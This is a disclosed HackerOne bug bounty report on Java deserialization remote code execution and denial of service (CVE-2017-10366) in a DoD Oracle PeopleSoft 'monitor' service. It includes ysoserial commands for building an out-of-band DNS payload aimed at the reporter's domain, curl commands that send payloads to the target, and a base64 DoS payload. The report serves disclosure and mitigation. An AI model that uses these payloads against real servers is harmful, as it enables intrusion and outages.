---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/deserialization-of-untrusted-data
  - env/web
  - vuln/code-injection
  - vuln/deserialization
  - vuln/rce-unsafe-deserialization
  - vuln/dos
  - impact/rce
substate: "resolved"
weakness: "Deserialization of Untrusted Data"
enriched: true
body: true
date: 2019-10-08
submitted: 2018-03-24T02:59:09.459Z
bounty_usd: null
votes: 6
cve: "CVE-2017-10366"
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "joaomatosf"
source: "https://hackerone.com/reports/329399"
title: "Remote Code Execution (RCE) in a DoD website"
---
# Remote Code Execution (RCE) in a DoD website

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2019-10-08

- Report: [https://hackerone.com/reports/329399](https://hackerone.com/reports/329399)
- CWE: Deserialization of Untrusted Data | CVE: CVE-2017-10366
- Submitted: 2018-03-24T02:59:09.459Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

SUMMARY:
====================

The DoD **`https://███/psc/EXPROD/`** Web System uses the Oracle PeopleSoft platform which is vulnerable to Remote Code Execution (RCE) and Denial of Service Attacks (DoS) over a Java Object Deserialization (CWE-502) in the “monitor” service. Thus an attacker can generate and send malicious java objects of special types to your system and achieve arbitrary effects (such as RCE os DoS) during their deserialization (the objects are deserialized by readObject() method without any type of validation). This is related to CVE-2017-10366 [1].

PROOF OF CONCEPT
====================

For PoC I sent a special serialized java object in order to force the vulnerable server to perform a DNS Lookup for a domain controlled by me (dod.jexboss.info). In this way, if the code is executed successfully by the DoD server I will receive a DNS query from DoD and see it in the logs of my BIND daemon (the vulnerable DoD server will perform a local DNS query for dod.jexboss.info and the local DNS will try to query the authoritative nameserver for the jexboss.info domain (ns1.jexboss.info), which is mine).

For more details about this payload used, see [2].

**Attached is a video detailing the PoC.**

**Generating the payload:** for generate the payload I used the tool ysoserial.
```
$ git clone https://github.com/frohoff/ysoserial.git
$ cd ysoserial
$ mvn clean package –DskipTests
$ cd target
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://dod.jexboss.info > payload
```

**Sending the payload to a vulnerable server:**
`curl https://█████/psc/EXPROD/ --data-binary`@payload`-k`

After sending the payload to the DoD server, the code was successfully executed and I received the DNS query on my BIND server, as can be seen in the log record below.
	
**BIND logs:**
```
23-Mar-2018 18:29:54.523 queries: info: client ███#5691: query: dod.jexboss.info IN A -ED (10.0.1.202)
```

**Denial Of Service (DoS)**

This vulnerability also allows denial of service attacks, but I can not perform this test because it puts the availability of your service at risk. If you want to validate this, use the following PoC:

**Generating payload for Denial of Service (DoS)[3]:**
```
echo -n "rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3dXEAfgAAf///93VxAH4AAH////d1cQB+AAB////3" | base64 -d > payload_dos
```

**Sending:**
`curl https://██████████/psc/EXPROD/ --data-binary`@payload_dos`-k`

This will make your service stop immediately and show the following error in the logs:
```Exception in thread "Thread-2" java.lang.OutOfMemoryError: Java heap space```

MITIGATION
====================

The best way to mitigate deserialization vulnerabilities is by not deserializing data received from users. In this particular case, any requests from the internet to the path **/monitor** should be rejected/blocked! 
Also, it is important to note that updating libraries used by attackers as Gadgets (such as commonsCollections) is not enough to protect against deserialization attacks, since new gadgets are discovered and published frequently. So, blocking the monitor service is best suited for this case!

REFERENCES:
====================
[1] - CVE-2017-10366. Link: https://nvd.nist.gov/vuln/detail/CVE-2017-10366
[2] - Triggering a DNS lookup using Java Deserialization. Link: https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
[3] - Java Deserialization DoS – payloads. Link: http://topolik-at-work.blogspot.com.br/2016/04/java-deserialization-dos-payloads.html

Best Regards, 
João Filho Matos Figueiredo, @joaomatosf

## Impact

This vulnerability allows:
1) Remote Code Execution (**RCE**)
2) Denial of Service (DoS)

## Timeline

- **Report Filed**
- **2018-03-24** @joaomatosf: OBS: This report describes a vulnerability similar to that described in my other reports #329376, #329397, #329400
- **Report Severity Updated**
- **Report Triaged**
- **2018-04-18** @joaomatosf: Hi dear,

I was rereading the report and realized that it is necessary to make a little fix on the curl command to play the PoC. 
When running the PoC replace "/psc/" with "/monitor/" in the url exactly as shown in the attached video.

Best Regards,
- **Report Resolved**
- **Agreed On Going Public**
- **2019-01-11** @joaomatosf: Hi dear,

Happy new year to you all in DoD =].

It has been some time since I sent this report (10 months) and it was finalized as resolved (5 months). Could you, please kindly approve the partial disclosure of it? =)

This year I intend to send many reports to you =]

Thank you.
- **Agreed On Going Public**
- **Report Became Public**
